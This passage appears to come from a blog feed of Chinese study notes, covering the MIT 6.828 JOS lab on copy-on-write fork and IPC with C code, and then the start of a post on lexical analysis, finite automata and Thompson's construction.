src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310111631565.png"></p><p>理解完这一过程,再来看看如何找到想访问的页表或页表项的地址.<br>对于32位地址addr –&gt; PDX|PTX|OFFSET.</p><p>PDX是页目录表的索引,要让它索引到自身,便固定了得是(UPVT&gt;&gt;22)<br>由于我们将页目录表当作是页表,则PTX同样也用来在页目录表上索引,查找到的物理地址意义为第PTX个页表的物理地址.<br>OFFSET便用于在页表上偏移,页表的内容是页表条目,每个大小4字节,所以OFFSET便是该页表的第OFFSET/4项.</p><p>综合起来,upvt[n]就相当于访问了物理空间第n页的页表条目.<br>upvt[addr&gt;&gt;12]访问的就是addr所在物理页的页表条目.<br>upvd[addr&gt;&gt;22]访问的就是addr对应的页表在页目录表中的条目.<br>这也解释了entry.S中的宏定义.<br>其实挺反直觉的,页目录表映射到UVPT,但访问UVPT却访问到的是第0页的页表.而页目录表要用uvpd去访问(UVPT+(UVPT&gt;&gt;12)*4).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.globl uvpt</span><br><span class="line">.<span class="built_in">set</span> uvpt, UVPT</span><br><span class="line">.globl uvpd</span><br><span class="line">.<span class="built_in">set</span> uvpd, (UVPT+(UVPT&gt;&gt;<span class="number">12</span>)*<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="Fork代码实现"><a href="#Fork代码实现" class="headerlink" title="Fork代码实现"></a>Fork代码实现</h5><p>pgfault是Custom page fault handler,如果发生页面错误的是对COW页面的写入操作,分配一个物理页拷贝原数据并设定可写</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Custom page fault handler - if faulting page is copy-on-write,</span></span><br><span class="line"><span class="comment">// map in our own private writable copy.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">pgfault</span><span class="params">(<span class="keyword">struct</span> UTrapframe *utf)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *addr = (<span class="type">void</span> *) utf-&gt;utf_fault_va;</span><br><span class="line"><span class="type">uint32_t</span> err = utf-&gt;utf_err;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((err&amp;FEC_WR)==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"pgfault: the faulting access was not a write\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">pte_t</span> pte = ((<span class="type">pte_t</span>*)UVPT)[PGNUM(addr)];</span><br><span class="line"><span class="keyword">if</span>((pte&amp;PTE_COW)==<span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"pgfault: the faulting access was not to a copy-on-write page\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((r = sys_page_alloc(<span class="number">0</span>,PFTEMP,PTE_W|PTE_U)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"pgfault: page_alloc error when COW\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span>*)PFTEMP,ROUNDDOWN(addr,PGSIZE),PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(sys_page_map(<span class="number">0</span>,PFTEMP,<span class="number">0</span>,ROUNDDOWN(addr,PGSIZE),PTE_W|(pte&amp;PTE_SYSCALL&amp;~PTE_COW)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"pgfault: page_map error when COW\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_unmap(<span class="number">0</span>, (<span class="type">void</span> *)PFTEMP)) &lt; <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">"pgfault: sys_page_unmap() failed: %e\n"</span>, r);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>duppage映射页面pn到envid(子)进程,若为可写页面或COW则将自身(父进程)和envid进程中该页均映射为COW(因为父进程可能也是fork出来的且并没有得到独立的页面,仅是COW).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">duppage</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">unsigned</span> pn)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">uintptr_t</span> addr = pn*PGSIZE;</span><br><span class="line"></span><br><span class="line"><span class="type">pte_t</span> pte = ((<span class="type">pte_t</span>*)UVPT)[pn];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pte&amp;(PTE_W|PTE_COW))</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line"><span class="comment">//为子进程映射页面并设置PTE_COW</span></span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,(<span class="type">void</span>*)addr,envid,(<span class="type">void</span>*)addr,PTE_COW|PTE_U|(pte&amp;PTE_SYSCALL&amp;~PTE_W)))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//清除父进程的PTE_W并设置PTE_COW</span></span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,(<span class="type">void</span>*)addr,<span class="number">0</span>,(<span class="type">void</span>*)addr,PTE_COW|PTE_U|(pte&amp;PTE_SYSCALL&amp;~PTE_W)))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,(<span class="type">void</span>*)addr,envid,(<span class="type">void</span>*)addr,PTE_U|(pte&amp;PTE_SYSCALL)))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>fork创建子进程,为子进程映射(duppage)地址空间.为自身和子进程安装错误处理函数.<br>注意子进程的错误处理函数一定要由父进程安装,因为子进程在调用函数或系统调用时的压栈操作会触发页面错误(目前子进程的栈还是COW的),而错误处理函数还未安装,无法处理.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// User-level fork with copy-on-write.</span></span><br><span class="line"><span class="comment">// Set up our page fault handler appropriately.</span></span><br><span class="line"><span class="comment">// Create a child.</span></span><br><span class="line"><span class="comment">// Copy our address space and page fault handler setup to the child.</span></span><br><span class="line"><span class="comment">// Then mark the child as runnable and return.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns: child's envid to the parent, 0 to the child, &lt; 0 on error.</span></span><br><span class="line"><span class="comment">// It is also OK to panic on error.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//   Use uvpd, uvpt, and duppage.</span></span><br><span class="line"><span class="comment">//   Remember to fix "thisenv" in the child process.</span></span><br><span class="line"><span class="comment">//   Neither user exception stack should ever be marked copy-on-write,</span></span><br><span class="line"><span class="comment">//   so you must allocate a new page for the child's user exception stack.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">envid_t</span></span><br><span class="line"><span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">envid_t</span> ceid;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line">set_pgfault_handler(pgfault);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((ceid = sys_exofork())&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> ceid; </span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ceid == <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="comment">//child</span></span><br><span class="line">thisenv = &amp;(envs[sys_getenvid()&amp;<span class="number">0x3FF</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uintptr_t</span> va = <span class="number">0</span>; va &lt; UTOP;) </span><br><span class="line">{</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pde_t</span> uvpd[];</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pte_t</span> uvpt[];</span><br><span class="line"><span class="keyword">if</span> ((uvpd[va &gt;&gt; PDXSHIFT] &amp; PTE_P) == <span class="number">0</span>) </span><br><span class="line">{    <span class="comment">// page table page not found.</span></span><br><span class="line">va += NPTENTRIES * PGSIZE;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> ((uvpt[va &gt;&gt; PTXSHIFT] &amp; PTE_P) == <span class="number">0</span>) </span><br><span class="line">{    <span class="comment">// page table entry not found.</span></span><br><span class="line">va += PGSIZE;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (va == UXSTACKTOP - PGSIZE) </span><br><span class="line">{    <span class="comment">// UXSTACKTOP is not remmaped!</span></span><br><span class="line">va += PGSIZE;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// this page should be duppage()d.</span></span><br><span class="line"><span class="keyword">if</span> ((result = duppage(ceid, (<span class="type">unsigned</span>)(va/PGSIZE))) &lt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">va += PGSIZE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((result = sys_page_alloc(ceid, (<span class="type">void</span> *)(UXSTACKTOP-PGSIZE), (PTE_U|PTE_W))) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> _pgfault_upcall(<span class="type">void</span>);</span><br><span class="line">sys_env_set_pgfault_upcall(ceid,_pgfault_upcall);</span><br><span class="line">sys_env_set_status(ceid,ENV_RUNNABLE);</span><br><span class="line"><span class="keyword">return</span> ceid;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Copy-On-Write流程分析"><a href="#Copy-On-Write流程分析" class="headerlink" title="Copy-On-Write流程分析"></a>Copy-On-Write流程分析</h5><h6 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h6><p>为了开启Copy-On-Write,要为环境安装_pgfault_upcall函数和_pgfault_handler.前者是汇编实现的page fault处理例程的入口点,会调用后者进行page fault的处理并完成traptime状态的恢复.该安装过程由set_pgfault_handler函数完成,且由于上文提过的原因,子进程_pgfault_upcall函数必须由父进程安装.set_pgfault_handler同时为进程分配单独的错误处理堆栈,子进程的错误处理堆栈由父进程分配.</p><h6 id="触发Copy-On-Write"><a href="#触发Copy-On-Write" class="headerlink" title="触发Copy-On-Write"></a>触发Copy-On-Write</h6><p>当进程对带有PTE_COW标志的页进行写入操作时,由于没有PTE_W权限,处理器触发pagefault,陷入内核态,由常规的异常处理流程,最终到达内核态的page_fault_handler函数.该函数检查环境的_pgfault_upcall是否安装,是否是递归页面错误,为页面处理准备UTrapFrame结构,最后env_run返回到用户态从_pgfault_upcall开始执行.</p><h6 id="处理Copy-On-Write"><a href="#处理Copy-On-Write" class="headerlink" title="处理Copy-On-Write"></a>处理Copy-On-Write</h6><p>_pgfault-upcall函数调用用户安装的_pgfault_handler.本实现中该函数流程如下.检查此次pgfault的类型,是否为写入操作,页面是否是COW…若通过检查便为触发pgfault的虚拟地址重新分配一个物理页,拷贝原页的内容.</p><h6 id="恢复到traptime"><a href="#恢复到traptime" class="headerlink" title="恢复到traptime"></a>恢复到traptime</h6><p>现在触发pgfault的地址已经有了独立的一个可写页面,pgfault_upcall函数恢复到traptime状态继续执行,这次的写入操作可以正常进行了.</p><h4 id="Inter-Process-communication-IPC"><a href="#Inter-Process-communication-IPC" class="headerlink" title="Inter-Process communication (IPC)"></a>Inter-Process communication (IPC)</h4><p>本实现中采用的共享方式是:</p><ol><li>通过envs所在的所有环境共享的可读页传递value.</li><li>将sender的某页面映射到recver的页面上<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_ipc_try_send</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">uint32_t</span> value, <span class="type">void</span> *srcva, <span class="type">unsigned</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">pte_t</span>* pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">0</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((e-&gt;env_status != ENV_NOT_RUNNABLE) || (e-&gt;env_ipc_recving==<span class="number">0</span>))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_IPC_NOT_RECV;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(((<span class="type">uintptr_t</span>)srcva!=<span class="number">-1</span>)&amp;&amp;((<span class="type">uintptr_t</span>)e-&gt;env_ipc_dstva!=<span class="number">-1</span>))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((<span class="type">uintptr_t</span>)srcva&gt;=UTOP||(srcva!=ROUNDDOWN(srcva,PGSIZE))||((perm&amp;PTE_SYSCALL)!=perm))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(page = page_lookup(curenv-&gt;env_pgdir,srcva,&amp;pte)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(((*pte&amp;PTE_W)==<span class="number">0</span>)&amp;&amp;((perm&amp;PTE_W)==PTE_W))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = page_insert(e-&gt;env_pgdir,page,e-&gt;env_ipc_dstva,perm)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">e-&gt;env_ipc_perm = perm;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">e-&gt;env_ipc_perm = <span class="number">0</span>;</span><br><span class="line">e-&gt;env_ipc_recving = <span class="number">0</span>;</span><br><span class="line">e-&gt;env_ipc_from = curenv-&gt;env_id;</span><br><span class="line">e-&gt;env_ipc_value = value;</span><br><span class="line"></span><br><span class="line">e-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_ipc_recv</span><span class="params">(<span class="type">void</span> *dstva)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">uint32_t</span>)dstva != <span class="number">-1</span>) </span><br><span class="line">{</span><br><span class="line">        <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)dstva &gt;= UTOP) || (dstva!=ROUNDDOWN(dstva,PGSIZE)))</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    }</span><br><span class="line">    curenv-&gt;env_ipc_recving = <span class="number">1</span>;</span><br><span class="line">    curenv-&gt;env_ipc_dstva = dstva;</span><br><span class="line">    curenv-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">    </span><br><span class="line">    curenv-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line">    sys_yield();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int32_t</span></span><br><span class="line"><span class="title function_">ipc_recv</span><span class="params">(<span class="type">envid_t</span> *from_env_store, <span class="type">void</span> *pg, <span class="type">int</span> *perm_store)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>(pg==<span class="literal">NULL</span>)</span><br><span class="line">pg = (<span class="type">void</span>*)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>((result = sys_ipc_recv(pg))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(from_env_store!=<span class="literal">NULL</span>)</span><br><span class="line">*from_env_store = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(perm_store!=<span class="literal">NULL</span>)</span><br><span class="line">*perm_store=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(from_env_store!=<span class="literal">NULL</span>)</span><br><span class="line">*from_env_store = thisenv-&gt;env_ipc_from;</span><br><span class="line"><span class="keyword">if</span>(perm_store!=<span class="literal">NULL</span>)</span><br><span class="line">*perm_store=thisenv-&gt;env_ipc_perm;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> thisenv-&gt;env_ipc_value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_send</span><span class="params">(<span class="type">envid_t</span> to_env, <span class="type">uint32_t</span> val, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>(pg == <span class="literal">NULL</span>)</span><br><span class="line">pg = (<span class="type">void</span>*)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">result = sys_ipc_try_send(to_env,val,pg,perm);</span><br><span class="line"><span class="keyword">if</span>(!result)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(result == -E_IPC_NOT_RECV)</span><br><span class="line">{</span><br><span class="line">sys_yield();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line">panic(<span class="string">"ipc_send: fail in send--%e\n"</span>,result);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>词法分析</title>
      <link href="/2023/Lexical-Analysis/"/>
      <url>/2023/Lexical-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h2><p>词法分析是编译的第一阶段.词法分析主要任务是读入输入字符,产生记号(token)序列,提交给语法分析使用.<br>由于这种交互模式,词法分析器可以作为语法分析器的子程序或协作程序.语法分析器每次调用词法分析器持续读入字符,直到识别出下一个记号.</p><p>词法分析除了产生记号,也收集记号相关的信息作为记号的属性(比如数字的值,标识符对应的字符串).记号影响语法分析,记号的属性影响记号的翻译.属性一般存储在符号表中.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121650256.png"></p><span id="more"></span><h2 id="记号、模式、词素"><a href="#记号、模式、词素" class="headerlink" title="记号、模式、词素"></a>记号、模式、词素</h2><p>词素是源程序的字符序列</p><p>模式是描述源程序中表示特定记号的词素集合的规则.</p><p>每个符合某模式的词素经词法分析后产生对应的记号.</p><h2 id="记号的描述"><a href="#记号的描述" class="headerlink" title="记号的描述"></a>记号的描述</h2><p>字母表: 有限符号的集合<br>语言是给定字母表上任意字符串的集合.</p><h3 id="正规表达式-Regular-Expressions"><a href="#正规表达式-Regular-Expressions" class="headerlink" title="正规表达式 Regular Expressions"></a>正规表达式 Regular Expressions</h3><p>正规表达式表示的语言叫做正规集.</p><h4 id="非正规集"><a href="#非正规集" class="headerlink" title="非正规集"></a>非正规集</h4><p>正规表达式描述能力有限,其不能描述均衡或嵌套结构,如具有配对括号的符号串集合.<br>正规表达式只能表示固定次数的重复或给定结构的没有指定次数的重复.</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>接下来我们要完成对一个给定的正规表达式r的识别器的构造.</p><h2 id="有穷自动机"><a href="#有穷自动机" class="headerlink" title="有穷自动机"></a>有穷自动机</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>语言的识别器是一个程序,它以字符串x作为输入,输出true(接受)或false来表示x是否是语言的句子.</p><p>不确定的有穷自动机(NFA):<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121724289.png"><br>NFA可以由带标记的有向图(状态转换图),转换表表示.<br>F(T,a)=S:在T状态时,如果当前输入字符是a,可以转换到S状态(对于NFA来说,这里的S可能是一个状态集合)<br>当且仅当对应的转换图中存在从开始状态到某个接受状态的路径,使得该路径的便上的标记恰好连成字符串x时,NFA接受字符串x.</p><p>确定的有穷自动机(DFA)是特殊的NFA:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121725005.png"><br>也就是对于当前正在识别的字符a,当前状态有唯一的转换,这非常适合计算机的模拟.</p><h3 id="模拟DFA"><a href="#模拟DFA" class="headerlink" title="模拟DFA"></a>模拟DFA</h3><p>算法: 持续读入字符并根据当前输入字符进行状态转换(“对于当前正在识别的字符a,当前状态有唯一的转换”),当输入结束,检查当前状态是否为一个接受状态.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121735931.png"></p><p>有了DFA的模拟算法,现在只需要构造r的DFA表示.</p><h3 id="从正规表达式到NFA"><a href="#从正规表达式到NFA" class="headerlink" title="从正规表达式到NFA"></a>从正规表达式到NFA</h3><p>然而更容易的方式是从正规表达式r先构造出一个NFA.</p><h4 id="Thompson构造法"><a href="#Thompson构造法" class="headerlink" title="Thompson构造法"></a>Thompson构造法</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121745954.png"></p><p>对于字符表中的每个符号a(包括ε),构造一个如下的NFA.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121750561.png"></p><p>接下来要做的便是根据正规表达式r来”组合”之前产生的NFA.<br>实际就是改变之前各NFA初始状态和接受状态,并增加一些结点和有向边,从而”组合”成r的NFA.<br><img 